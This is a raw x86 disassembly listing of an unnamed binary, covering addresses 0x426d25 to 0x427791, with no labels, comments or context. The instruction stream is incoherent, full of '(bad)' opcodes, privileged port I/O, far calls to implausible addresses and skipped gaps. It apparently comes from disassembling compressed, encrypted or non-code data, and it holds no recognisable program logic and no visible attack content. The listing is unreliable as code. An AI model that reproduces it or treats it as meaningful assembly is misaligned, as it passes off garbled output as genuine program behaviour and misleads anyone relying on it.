  426d25:	cmp    DWORD PTR [edi-0x69],edi
  426d28:	sbb    DWORD PTR [ecx],edx
  426d2a:	jl     0x426d87
  426d2c:	pop    ds
  426d2d:	or     DWORD PTR [esi],esp
  426d2f:	xor    eax,DWORD PTR [esi+ecx*1]
  426d32:	pusha  
  426d33:	add    ecx,DWORD PTR [edi]
  426d35:	in     eax,dx
  426d36:	sub    al,0x98
  426d38:	sbb    eax,0x9cb7c420
  426d3d:	push   ss
  426d3e:	clc    
  426d3f:	push   ss
  426d40:	nop
  426d41:	mov    bl,0xea
  426d43:	or     BYTE PTR [esp+ebx*8],ch
  426d46:	push   ecx
  426d47:	add    dh,BYTE PTR [esi-0x6ca55263]
  426d4d:	mov    ebp,0xfb7d8458
  426d52:	dec    DWORD PTR [edi-0x3d3cf983]
  426d58:	cmp    al,0xa
  426d5a:	inc    esp
  426d5b:	push   esp
  426d5c:	clc    
  426d5d:	addr16 sbb eax,0x92cf5258
  426d63:	or     ecx,DWORD PTR [ebp+eax*4+0x70]
  426d67:	pop    esi
  426d68:	add    ecx,DWORD PTR fs:[ebp-0x2d896843]
  426d6f:	out    0x4c,eax
  426d71:	mov    WORD PTR [edx+0x4e],?
  426d74:	sub    BYTE PTR [ebx-0x6a36789a],al
  426d7a:	push   eax
  426d7b:	bound  esi,QWORD PTR [esi+0x71a1edb0]
  426d81:	push   0xffffffdc
  426d83:	stos   DWORD PTR es:[edi],eax
  426d84:	(bad)  
  426d86:	aaa    
  426d87:	and    esi,DWORD PTR [ecx+eiz*4]
  426d8a:	inc    esi
  426d8b:	in     al,dx
  426d8c:	mov    ds:0xef573816,eax
  426d91:	in     al,0xd
  426d93:	jmp    0x426d47
  426d95:	sub    BYTE PTR [edi-0x28],bh
  426d98:	test   BYTE PTR [eax*2-0x7f69aa60],al
  426d9f:	fucomi st,st(3)
  426da1:	mov    edi,0x109e59ae
  426da6:	jle    0x426ddb
  426da8:	jbe    0x426d38
  426daa:	and    bh,BYTE PTR [ebp+0x462fea8a]
  426db0:	fadd   QWORD PTR [ebp-0x341e8773]
  426db6:	mov    eax,0x90b8c7d4
  426dbb:	imul   esp,DWORD PTR [edi],0x6f0518ad
  426dc1:	and    edx,ebx
  426dc3:	call   0x33de4b7e
  426dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dc9:	lds    edi,FWORD PTR [esp+ecx*1]
  426dcc:	lods   al,BYTE PTR ds:[esi]
  426dcd:	mov    eax,DWORD PTR [ecx]
  426dcf:	stos   BYTE PTR es:[edi],al
  426dd0:	and    al,0x19
  426dd2:	cli    
  426dd3:	jns    0x426de9
  426dd5:	or     esi,eax
  426dd7:	adc    DWORD PTR [eax+0x400ef7df],edi
  426ddd:	fcom   QWORD PTR [ebp-0x37]
  426de0:	icebp  
  426de1:	les    edx,FWORD PTR [ecx-0x12]
  426de4:	inc    ebp
  426de5:	bnd jne 0x426e13
  426de8:	(bad)
  426deb:	into   
  426dec:	dec    ebx
  426ded:	rol    DWORD PTR [eax],0x0
	...
  426e54:	add    BYTE PTR [eax],al
  426e56:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426e5c:	call   0x970c:0xc7c2ecf9
  426e63:	mov    bl,0x86
  426e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e66:	addr16 mov eax,ds:0x1
  426e6a:	add    BYTE PTR [ecx],al
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	(bad)
  426e73:	jb     0x426e61
  426e75:	mov    ch,0xbd
  426e77:	xor    al,0x2d
  426e79:	in     eax,dx
  426e7a:	sti    
  426e7b:	add    BYTE PTR [edi],al
  426e7d:	cmp    ecx,0x24
  426e80:	add    al,0xd6
  426e82:	test   al,0x83
  426e84:	xchg   esi,eax
  426e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e86:	xchg   ebx,eax
  426e87:	mov    WORD PTR [eax+0x4b4efe69],cs
  426e8d:	dec    esi
  426e8e:	mov    ebp,0x2c7baa05
  426e93:	sbb    ch,bl
  426e95:	jp     0x426e94
  426e97:	mov    dl,0xb4
  426e99:	popa   
  426e9a:	jge    0x426ed4
  426e9c:	stos   BYTE PTR es:[edi],al
  426e9d:	sbb    esp,0x4ffff0cb
  426ea3:	pushf  
  426ea4:	pop    ss
  426ea5:	xchg   ecx,eax
  426ea6:	lds    ebp,FWORD PTR [eax]
  426ea8:	arpl   WORD PTR ds:0xaef2fd4,sp
  426eae:	or     eax,0x82c7eb72
  426eb3:	(bad)  
  426eb4:	hlt    
  426eb5:	push   0x36c7e8b1
  426eba:	mov    ebp,0xebf2e320
  426ebf:	cmovnp ebx,esp
  426ec2:	push   edx
  426ec3:	sub    BYTE PTR [edx],dh
  426ec5:	and    edx,ebp
  426ec7:	outs   dx,BYTE PTR ds:[esi]
  426ec8:	and    DWORD PTR [esi+0x70],ebx
  426ecb:	sub    al,ah
  426ecd:	clc    
  426ece:	sti    
  426ecf:	addr16 dec edx
  426ed1:	push   esp
  426ed2:	jmp    0x426eb5
  426ed4:	test   al,0xc3
  426ed6:	test   al,0x44
  426ed8:	inc    ebp
  426ed9:	test   al,al
  426edb:	int    0x21
  426edd:	repz daa 
  426edf:	mov    al,ds:0x7cafc98c
  426ee4:	inc    eax
  426ee5:	xchg   DWORD PTR [edx-0x3e5c573],edi
  426eeb:	nop
  426eec:	cdq    
  426eed:	mov    cl,0x3c
  426eef:	sar    DWORD PTR [edx-0x33578a1d],1
  426ef5:	test   cl,dl
  426ef7:	inc    edx
  426ef8:	sub    al,0xf0
  426efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426efb:	jge    0x426e9c
  426efd:	dec    esp
  426efe:	std    
  426eff:	arpl   WORD PTR [esi+0x11],di
  426f02:	pop    ds
  426f03:	daa    
  426f04:	fistp  QWORD PTR [ebx]
  426f06:	sub    BYTE PTR [esi-0x27],ch
  426f09:	sbb    eax,0x8b5a0e17
  426f0e:	pop    edi
  426f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f10:	sub    al,0x8b
  426f12:	jle    0x426f08
  426f14:	adc    DWORD PTR [esp+ecx*2+0x1f],0xffffffdc
  426f19:	push   esp
  426f1a:	pop    ecx
  426f1b:	mov    eax,0xac7df0e
  426f20:	fwait
  426f21:	add    eax,0x32356f74
  426f26:	out    dx,al
  426f27:	pop    ebp
  426f28:	(bad)  
  426f29:	shl    DWORD PTR [ecx-0x29],cl
  426f2c:	cmp    eax,0xc5d69338
  426f31:	cmc    
  426f32:	mov    al,ds:0x1ec545ae
  426f37:	jmp    FWORD PTR [ebx+0x23]
  426f3a:	mov    esi,0xab65241e
  426f3f:	cmp    DWORD PTR [esi+0x28],ecx
  426f42:	xor    BYTE PTR [edx+edi*8-0x5fc5eef],cl
  426f49:	adc    edx,DWORD PTR [esi+0x13]
  426f4c:	pop    es
  426f4d:	shl    esi,1
  426f4f:	xchg   ecx,eax
  426f50:	pop    es
  426f51:	and    eax,0xe49f838b
  426f56:	sbb    al,0xf
  426f58:	bound  esp,QWORD PTR [edi-0x2ced3e55]
  426f5e:	mov    al,ds:0xbcad56f7
  426f63:	fs retf 0x2429
  426f67:	jge    0x426f6c
  426f69:	fwait
  426f6a:	inc    ebx
  426f6b:	test   BYTE PTR [eax+0x64],bh
	...
  426fd5:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [ebp+ebx*4+0x6784242f],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	das    
  426fef:	enter  0xfa53,0xa5
  426ff3:	jmp    0x427001
  426ff5:	dec    edi
  426ff6:	or     eax,0x6ffbf754
  426ffb:	in     eax,0x7f
  426ffd:	pop    ds
  426ffe:	jne    0x426fce
  427000:	mov    dh,0x83
  427002:	lahf   
  427003:	mov    edi,DWORD PTR [ecx]
  427005:	or     ebp,DWORD PTR [ebp+0x4c6d0dde]
  42700b:	test   al,0x73
  42700d:	sbb    DWORD PTR [eax+edx*2+0x5ff19ba8],ebx
  427014:	loopne 0x42705d
  427016:	or     eax,0x735f88bf
  42701b:	fmul   st(0),st
  42701d:	mov    esp,0xaa598b18
  427022:	and    eax,DWORD PTR [ecx]
  427024:	add    esi,eax
  427026:	jbe    0x427065
  427028:	or     DWORD PTR [edx],0x4d12e9be
  42702e:	fcomp  DWORD PTR [edx+0x6fdeeb93]
  427034:	cli    
  427035:	sub    al,0xf3
  427037:	inc    esi
  427038:	fmulp  st(5),st
  42703a:	adc    al,cl
  42703c:	jne    0x426ffd
  42703e:	out    dx,eax
  42703f:	out    0x6,al
  427041:	push   ds
  427042:	mov    esi,DWORD PTR [esi]
  427044:	je     0x427016
  427046:	push   cs
  427047:	mov    ah,dh
  427049:	inc    esp
  42704a:	push   cs
  42704b:	dec    edx
  42704c:	push   esi
  42704d:	popf   
  42704e:	xchg   DWORD PTR [edi+0x3],ecx
  427051:	dec    ebp
  427052:	addr16 das 
  427054:	xchg   esp,eax
  427055:	sub    BYTE PTR [ebx],al
  427057:	fist   DWORD PTR [esp+ecx*2+0x69]
  42705b:	mov    esp,0xedfe2f77
  427060:	cmp    ebx,DWORD PTR [eax]
  427062:	dec    ecx
  427063:	enter  0x8829,0xcd
  427067:	add    eax,DWORD PTR [edi]
  427069:	xchg   edi,eax
  42706a:	sub    al,0xf9
  42706c:	xchg   ebp,eax
  42706d:	jge    0x42708b
  42706f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427070:	push   esi
  427071:	push   esi
  427072:	ins    DWORD PTR es:[edi],dx
  427073:	cmp    dl,bh
  427075:	pop    esi
  427076:	xchg   BYTE PTR [edx-0x5911ec54],ah
  42707c:	dec    edx
  42707d:	retf   0x824e
  427080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427081:	or     eax,0x3c40e2af
  427086:	repz test esp,esp
  427089:	pop    ebx
  42708a:	imul   ecx,DWORD PTR [ebp-0x4e175130],0x5d8ca862
  427094:	pop    esp
  427095:	add    eax,0xa21750fc
  42709a:	fwait
  42709b:	cld    
  42709c:	(bad)  
  42709d:	loopne 0x427113
  42709f:	jns    0x42708a
  4270a1:	push   ss
  4270a2:	sub    cl,BYTE PTR [eax+0x1d88bb2]
  4270a8:	mov    bl,0x76
  4270aa:	(bad)  
  4270ab:	adc    eax,DWORD PTR [edi-0x71d4a717]
  4270b1:	and    al,0xbb
  4270b3:	or     eax,0x127c8508
  4270b8:	dec    ebp
  4270b9:	aad    0xe
  4270bb:	mov    cs,esp
  4270bd:	add    al,0x8d
  4270bf:	iret   
  4270c0:	stc    
  4270c1:	xchg   esi,eax
  4270c2:	cli    
  4270c3:	pop    edi
  4270c4:	in     al,dx
  4270c5:	sbb    dl,ch
  4270c7:	mov    WORD PTR [ecx-0x6d2b0c16],fs
  4270cd:	shl    DWORD PTR [esi-0x1],0x81
  4270d1:	push   dx
  4270d3:	mov    cl,0x32
  4270d5:	xlat   BYTE PTR ds:[ebx]
  4270d6:	shl    DWORD PTR [ecx],cl
  4270d8:	leave  
  4270d9:	scas   eax,DWORD PTR es:[edi]
  4270da:	xor    BYTE PTR [edx+0x56],dl
  4270dd:	xchg   ebx,eax
  4270de:	dec    ebx
  4270df:	jp     0x427139
  4270e1:	int3   
  4270e2:	(bad)
  4270e7:	push   eax
  4270e8:	daa    
  4270e9:	cmp    eax,0xefef9367
	...
  427156:	or     al,0x6d
  427158:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42715e:	inc    esp
  42715f:	mov    ebp,0x88659d96
  427164:	or     ah,dl
  427166:	addr16 mov ds:0x1,eax
  42716a:	add    BYTE PTR [ecx],al
  42716c:	add    BYTE PTR [eax],al
  42716e:	fld    TBYTE PTR [edx]
  427170:	arpl   WORD PTR [ebx+0xc],di
  427173:	div    al
  427175:	sbb    eax,0xaaaa4312
  42717a:	lahf   
  42717b:	mov    ch,BYTE PTR [esi-0x12b0821f]
  427181:	pop    ds
  427182:	lock pushf 
  427184:	nop
  427185:	push   cs
  427186:	adc    eax,0x1f62cca0
  42718b:	shl    DWORD PTR [ecx-0x6cc94fd3],0x12
  427192:	loop   0x42715a
  427194:	mov    eax,0x52cea55b
  427199:	dec    edi
  42719a:	push   0x39964c4b
  42719f:	xor    BYTE PTR [eax-0x29f07b37],cl
  4271a5:	dec    eax
  4271a6:	fwait
  4271a7:	sbb    al,0x80
  4271a9:	add    eax,0x28340dde
  4271ae:	in     al,dx
  4271af:	cld    
  4271b0:	ja     0x42717c
  4271b2:	(bad)  
  4271b3:	(bad)  [ecx-0x5f]
  4271b6:	imul   BYTE PTR [edx-0xf]
  4271b9:	pop    es
  4271ba:	inc    esi
  4271bb:	ss push ebp
  4271bd:	xor    eax,0xa3abdf99
  4271c2:	inc    ebp
  4271c3:	xchg   edx,eax
  4271c4:	mov    dl,0x7a
  4271c6:	xchg   DWORD PTR [edi+edi*1],edi
  4271c9:	jge    0x4271df
  4271cb:	jns    0x42720d
  4271cd:	call   0xe50c:0xa1a15691
  4271d4:	or     bl,BYTE PTR [ebx]
  4271d6:	adc    bh,BYTE PTR [ebp-0x70f82eab]
  4271dc:	fs int 0x11
  4271df:	test   al,0xe0
  4271e1:	mov    ?,WORD PTR [ebx-0x31]
  4271e4:	loopne 0x42725e
  4271e6:	iret   
  4271e7:	shl    DWORD PTR ds:0xd8ab295d,0x24
  4271ee:	mov    dl,0x79
  4271f0:	push   ecx
  4271f1:	cmc    
  4271f2:	xchg   edx,eax
  4271f3:	jnp    0x427256
  4271f5:	mov    ch,0x33
  4271f7:	adc    eax,0x490a60fe
  4271fc:	push   0x777a513d
  427201:	ficomp DWORD PTR [ebp-0x7ae64d12]
  427207:	xchg   DWORD PTR [eax+0x1a],edi
  42720a:	enter  0xc8aa,0x50
  42720e:	lahf   
  42720f:	pusha  
  427210:	fisub  DWORD PTR cs:[eax]
  427213:	cmp    BYTE PTR [ecx],bh
  427215:	cmp    al,0x4c
  427217:	aaa    
  427218:	adc    al,0xcf
  42721a:	cmp    al,0x7a
  42721c:	xor    bh,0x98
  42721f:	pop    ds
  427220:	fnstsw WORD PTR [esi+eiz*2-0x363356ad]
  427227:	nop
  427228:	xchg   ecx,eax
  427229:	xchg   edx,eax
  42722a:	sbb    BYTE PTR [ecx+0x7f],0xaa
  42722e:	xchg   ecx,eax
  42722f:	cwde   
  427230:	mov    ebp,0x900407c2
  427235:	dec    ecx
  427236:	pop    ecx
  427237:	and    DWORD PTR [esp+edx*1-0x11],ecx
  42723b:	jae    0x427220
  42723d:	jge    0x4271e5
  42723f:	mov    bl,0xe6
  427241:	push   ds
  427242:	in     al,dx
  427243:	and    BYTE PTR [bx+di-0x593c],al
  427248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427249:	xor    esi,DWORD PTR [edx+0x3a3866a9]
  42724f:	ja     0x427261
  427251:	push   0xffffffcd
  427253:	ret    0x26e9
  427256:	jmp    0x42721b
  427258:	or     al,0x7f
  42725a:	lods   al,BYTE PTR ds:[esi]
  42725b:	fdiv   DWORD PTR [ebp-0x4b]
  42725e:	shl    BYTE PTR [ecx],1
  427260:	aad    0xcb
  427262:	rol    al,0x4d
  427265:	jo     0x427269
  427267:	sbb    BYTE PTR [edi+0x20],ch
  42726a:	ds pop eax
  42726c:	jns    0x4272d5
	...
  4272d6:	push   ds
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0x2b1a2f43,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	popf   
  4272ef:	pop    edx
  4272f0:	mov    WORD PTR [edx],fs
  4272f2:	hlt    
  4272f3:	test   eax,0x71c2798
  4272f8:	aad    0x8c
  4272fa:	sahf   
  4272fb:	sbb    ch,dh
  4272fd:	iret   
  4272fe:	stc    
  4272ff:	lods   eax,DWORD PTR ds:[esi]
  427300:	imul   ebp,DWORD PTR [ecx-0x179730d1],0xffffffef
  427307:	pop    ss
  427308:	stos   DWORD PTR es:[edi],eax
  427309:	scas   al,BYTE PTR es:[edi]
  42730a:	(bad)  
  42730b:	orps   xmm2,xmm4
  42730e:	add    BYTE PTR [edi+0x2f6f43a5],dh
  427314:	push   ebx
  427315:	jg     0x4272e7
  427317:	sbb    DWORD PTR [eax+esi*1],edx
  42731a:	adc    al,0x63
  42731c:	arpl   di,cx
  42731e:	inc    ecx
  42731f:	mov    al,ah
  427321:	ret    
  427322:	(bad)  ds:0x69bff67b
  427328:	ins    DWORD PTR es:[edi],dx
  427329:	jne    0x427336
  42732b:	sbb    eax,ebx
  42732d:	mov    eax,ds:0xd580a0
  427332:	les    edi,FWORD PTR [ecx+0x49]
  427335:	stos   DWORD PTR es:[edi],eax
  427336:	push   ebp
  427337:	cmp    BYTE PTR [ecx-0x73],ah
  42733a:	sub    DWORD PTR [ecx+0x2c80c432],edx
  427340:	fbstp  TBYTE PTR [esi+edi*1-0x1b]
  427344:	not    BYTE PTR ds:[eax-0x3dd56af0]
  42734b:	and    al,dh
  42734d:	push   ss
  42734e:	test   eax,0xe6df596e
  427353:	pop    esi
  427354:	fcomp  QWORD PTR ss:[ebp-0x55de9545]
  42735b:	dec    ecx
  42735c:	mov    ecx,0xcd1763c4
  427361:	lahf   
  427362:	ja     0x427365
  427364:	out    dx,al
  427365:	push   0xf
  427367:	mov    ch,0x9b
  427369:	cmp    dh,BYTE PTR [edi+ebx*8+0x784f5ae8]
  427370:	xor    ebp,DWORD PTR [edi+0x2c2afd79]
  427376:	push   edx
  427377:	pop    es
  427378:	aad    0x40
  42737a:	in     al,0x40
  42737c:	or     ebp,edi
  42737e:	sbb    eax,0x75140654
  427383:	mov    esi,0x4a410552
  427388:	gs repnz addr16 aas 
  42738c:	fsubr  DWORD PTR [edi]
  42738e:	mov    esi,0x3a5e6439
  427393:	imul   dl
  427395:	add    al,BYTE PTR [edi+ebp*4]
  427398:	push   edi
  427399:	xchg   dh,ch
  42739b:	fwait
  42739c:	cli    
  42739d:	xchg   ecx,eax
  42739e:	jmp    0x427355
  4273a0:	inc    eax
  4273a1:	mov    edi,edi
  4273a3:	stos   BYTE PTR es:[edi],al
  4273a4:	xchg   DWORD PTR [ebx],ebx
  4273a6:	adc    eax,0xc2cc2569
  4273ab:	jl     0x427375
  4273ad:	and    ecx,DWORD PTR [esi-0x4e]
  4273b0:	leave  
  4273b1:	or     al,0x95
  4273b3:	inc    eax
  4273b4:	inc    ecx
  4273b5:	ss bnd jmp 0x42741d
  4273b9:	jle    0x4273b5
  4273bb:	scas   al,BYTE PTR es:[edi]
  4273bc:	das    
  4273bd:	mov    ebp,0x592965f4
  4273c2:	int    0xc9
  4273c4:	in     eax,0xa2
  4273c6:	dec    eax
  4273c7:	push   esi
  4273c8:	adc    ch,ah
  4273ca:	mov    cl,ah
  4273cc:	out    0xf2,al
  4273ce:	jmp    0x42743e
  4273d0:	add    BYTE PTR [ecx+edi*4-0x1e57a4c],dl
  4273d7:	mov    dh,0x95
  4273d9:	(bad)  
  4273da:	lea    ebx,[esi]
  4273dc:	or     BYTE PTR [edi+eax*2-0x32100a4],dh
  4273e3:	jns    0x427457
  4273e5:	nop
  4273e6:	arpl   WORD PTR [edx],si
  4273e8:	sbb    DWORD PTR [ecx+edx*4],eax
  4273eb:	cmp    al,0x9c
  4273ed:	add    DWORD PTR [eax],eax
	...
  427453:	add    BYTE PTR [eax],al
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    esi,DWORD PTR [ebx]
  427463:	sahf   
  427464:	aaa    
  427465:	shl    BYTE PTR [edi-0x5b],cl
  427468:	add    DWORD PTR [eax],eax
  42746a:	add    BYTE PTR [ecx],al
  42746c:	add    BYTE PTR [eax],al
  42746e:	adc    eax,DWORD PTR [esi]
  427470:	dec    ebx
  427471:	ret    
  427472:	jle    0x4274d8
  427474:	sbb    DWORD PTR [ecx],eax
  427476:	push   ebx
  427477:	pop    edx
  427478:	sub    DWORD PTR ds:0xc69e6e4d,edi
  42747e:	xchg   edi,eax
  42747f:	xchg   ebp,eax
  427480:	push   ss
  427481:	in     eax,0xe1
  427483:	lods   eax,DWORD PTR ds:[esi]
  427484:	sub    eax,0x91dbe5f7
  427489:	out    0x88,al
  42748b:	dec    ebp
  42748c:	outs   dx,BYTE PTR ds:[esi]
  42748d:	push   ss
  42748e:	stos   DWORD PTR es:[edi],eax
  42748f:	jnp    0x427495
  427491:	mov    ebx,0xce76433
  427496:	test   al,0x4a
  427498:	sbb    DWORD PTR [esi+0x36ba3629],ecx
  42749e:	imul   edx,edi,0x2
  4274a1:	mov    ch,0x6a
  4274a3:	pop    eax
  4274a4:	imul   esp,ebx,0xd476ca39
  4274aa:	jmp    0xa7b8:0xc90a0e93
  4274b1:	fnsave [ebp+ebx*4+0x35]
  4274b5:	cli    
  4274b6:	(bad)  
  4274b7:	int    0xc7
  4274b9:	pop    ebp
  4274ba:	mov    bh,0xeb
  4274bc:	test   al,0x8f
  4274be:	(bad)  
  4274bf:	lds    esp,FWORD PTR [ebx]
  4274c1:	mov    ss,WORD PTR gs:[ebp-0xca63ff3]
  4274c8:	jno    0x427471
  4274ca:	aas    
  4274cb:	popf   
  4274cc:	inc    ebx
  4274cd:	sub    al,bl
  4274cf:	neg    DWORD PTR [eax-0x30]
  4274d2:	out    0xf6,eax
  4274d4:	(bad)  
  4274d5:	leave  
  4274d6:	popa   
  4274d7:	aad    0x12
  4274d9:	shl    DWORD PTR [ecx],0xc1
  4274dc:	sub    eax,0xc0ae2f63
  4274e1:	shl    DWORD PTR [edi],1
  4274e3:	bound  eax,QWORD PTR [ebp+0x6e]
  4274e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274e7:	push   edx
  4274e8:	test   bl,ch
  4274ea:	loop   0x427569
  4274ec:	pop    edi
  4274ed:	xchg   ecx,eax
  4274ee:	fucom  st(2)
  4274f0:	add    eax,ebp
  4274f2:	lods   al,BYTE PTR ds:[esi]
  4274f3:	sbb    BYTE PTR [ebp+0x25],cl
  4274f6:	das    
  4274f7:	ins    DWORD PTR es:[edi],dx
  4274f8:	test   BYTE PTR [esi-0x76],0x4d
  4274fc:	jge    0x427547
  4274fe:	lods   eax,DWORD PTR ds:[esi]
  4274ff:	test   eax,0xb10b2383
  427504:	pop    eax
  427505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427506:	or     dh,al
  427508:	xchg   ecx,ebp
  42750a:	or     DWORD PTR [edi+edx*4+0x43],ebx
  42750e:	push   ebp
  42750f:	mov    WORD PTR [ecx+0x24eb9bff],?
  427515:	jmp    0xa4aa8eef
  42751a:	stos   DWORD PTR es:[edi],eax
  42751b:	pushf  
  42751c:	(bad)  
  42751d:	and    eax,0xd385d184
  427522:	mov    eax,ds:0xd10fa4e2
  427527:	mov    bh,0x8a
  427529:	fs xchg edx,eax
  42752b:	iret   
  42752c:	jne    0x4274fc
  42752e:	cmc    
  42752f:	scas   eax,DWORD PTR es:[edi]
  427530:	xchg   ecx,eax
  427531:	xor    DWORD PTR [esi],esp
  427533:	and    DWORD PTR [edx-0x4cb664e0],esp
  427539:	out    0xc5,al
  42753b:	add    edx,0x9b8cd0a6
  427541:	pop    esi
  427542:	jecxz  0x4275b6
  427544:	jbe    0x4275a1
  427546:	retf   0x4e47
  427549:	push   es
  42754a:	add    cl,BYTE PTR [edi]
  42754c:	scas   eax,DWORD PTR es:[edi]
  42754d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42754e:	test   ch,cl
  427550:	aam    0x30
  427552:	cmc    
  427553:	into   
  427554:	jne    0x42755f
  427556:	rcr    BYTE PTR [ecx-0x4a625861],1
  42755c:	js     0x427584
  42755e:	pop    ebp
  42755f:	mov    gs,WORD PTR [ecx+0x709b6946]
  427565:	dec    edx
  427566:	(bad)  
  427567:	sar    BYTE PTR ds:0xc71c4150,1
  42756d:	mov    edi,0x0
	...
  4275d6:	pop    esp
  4275d7:	test   al,0xc0
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	repnz push esi
  4275e4:	bound  edi,QWORD PTR [ecx+0x67]
  4275e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	out    dx,al
  4275ef:	clc    
  4275f0:	add    eax,0x4c9c3a2e
  4275f5:	rcr    bl,1
  4275f7:	loop   0x427598
  4275f9:	add    dl,BYTE PTR [edx+0x60d922d3]
  4275ff:	cli    
  427600:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427602:	pusha  
  427603:	lds    edi,FWORD PTR [edi]
  427605:	jo     0x42763d
  427607:	and    eax,DWORD PTR [ebx]
  427609:	dec    ecx
  42760a:	imul   ecx,esi,0xffffff95
  42760d:	fisubr DWORD PTR [ebx+0x62]
  427610:	mov    ds:0x62d8243,eax
  427615:	mov    BYTE PTR [eax-0x6c],ah
  427618:	das    
  427619:	push   ebp
  42761a:	xchg   ebx,eax
  42761b:	push   ss
  42761c:	hlt    
  42761d:	jp     0x4275f5
  42761f:	cmp    al,0x31
  427621:	adc    eax,0xa4172395
  427626:	fist   DWORD PTR [ebx-0x2990e79d]
  42762c:	mov    ecx,0x35febd72
  427631:	outs   dx,DWORD PTR ds:[esi]
  427632:	sar    ah,1
  427634:	push   esp
  427635:	fwait
  427636:	mov    cl,0xe3
  427638:	ds dec eax
  42763a:	int3   
  42763b:	mov    WORD PTR [edi-0x7a51de61],?
  427641:	in     al,dx
  427642:	sbb    BYTE PTR [edi-0x22],bl
  427645:	sti    
  427646:	out    0x2e,al
  427648:	das    
  427649:	cmp    DWORD PTR [ebp+edi*1+0x5aee1d16],ebx
  427650:	pop    eax
  427651:	push   esp
  427652:	cmp    dl,cl
  427654:	repnz mov bl,BYTE PTR [esi+0x3310586]
  42765b:	mov    cl,0x14
  42765d:	cmp    al,0x8e
  42765f:	sbb    eax,0x2e80eb11
  427664:	aad    0xa
  427666:	inc    edi
  427667:	js     0x4276d7
  427669:	sahf   
  42766a:	lahf   
  42766b:	xchg   ebx,eax
  42766c:	jnp    0x42762b
  42766e:	inc    ecx
  42766f:	lock outs dx,BYTE PTR ds:[esi]
  427671:	push   ds
  427672:	jnp    0x427683
  427674:	out    0x91,al
  427676:	popa   
  427677:	(bad)  
  427678:	add    al,0x8c
  42767a:	xor    DWORD PTR [eax],ecx
  42767c:	call   0x4236:0x4004146f
  427683:	push   edi
  427684:	aam    0x2a
  427686:	adc    al,0x37
  427688:	int3   
  427689:	add    di,bx
  42768c:	dec    ecx
  42768d:	mov    al,ds:0xb3a75a1b
  427692:	imul   ebx,esi,0x1ee398e7
  427698:	pop    esi
  427699:	test   DWORD PTR [edi-0x23],ebx
  42769c:	and    al,0xa3
  42769e:	mov    eax,0xded67766
  4276a3:	add    eax,DWORD PTR [ecx+edi*2]
  4276a6:	jb     0x427725
  4276a8:	push   0x6a
  4276aa:	cmp    dl,BYTE PTR [ebp+0x36]
  4276ad:	inc    ecx
  4276ae:	push   ecx
  4276af:	sub    eax,ebp
  4276b1:	jg     0x4276f9
  4276b3:	fild   WORD PTR [ebx]
  4276b5:	lods   eax,DWORD PTR ds:[esi]
  4276b6:	or     al,0x2d
  4276b8:	sbb    BYTE PTR [eax-0x11a3d44d],bl
  4276be:	mov    eax,0x5ed092a2
  4276c3:	in     eax,dx
  4276c4:	sti    
  4276c5:	or     BYTE PTR [ecx-0x6d],dh
  4276c8:	shl    edi,0x15
  4276cb:	out    0x73,al
  4276cd:	xlat   BYTE PTR ds:[ebx]
  4276ce:	push   es
  4276cf:	cs jo  0x427747
  4276d2:	ss (bad) 
  4276d4:	jo     0x4276c2
  4276d6:	or     BYTE PTR [edi-0x79aa566c],dl
  4276dc:	dec    edx
  4276dd:	sbb    DWORD PTR [edx-0x6e5b6e4],eax
  4276e3:	mov    edx,0x6fedab65
  4276e8:	aas    
  4276e9:	jp     0x42768e
  4276eb:	sub    ecx,DWORD PTR [esi-0x47]
	...
  427756:	add    DWORD PTR [esi-0x70],edx
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fnstenv [edi]
  427763:	clc    
  427764:	push   esp
  427765:	cwde   
  427766:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  427768:	add    DWORD PTR [eax],eax
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	cld    
  42776f:	xor    eax,0x9f20b00d
  427774:	adc    BYTE PTR [ebx+ebx*4-0x7e],ah
  427778:	scas   al,BYTE PTR es:[edi]
  427779:	(bad)  
  42777a:	arpl   WORD PTR [edi+0x10f38ec8],di
  427780:	jmp    0x4277ba
  427782:	adc    eax,0x181f105e
  427787:	aam    0xe8
  427789:	adc    dh,dh
  42778b:	xchg   ebp,eax
  42778c:	xchg   ebp,eax
  42778d:	int    0x40
  42778f:	jecxz  0x42772d
  427791:	and    al,BYTE PTR [edi-0x31]
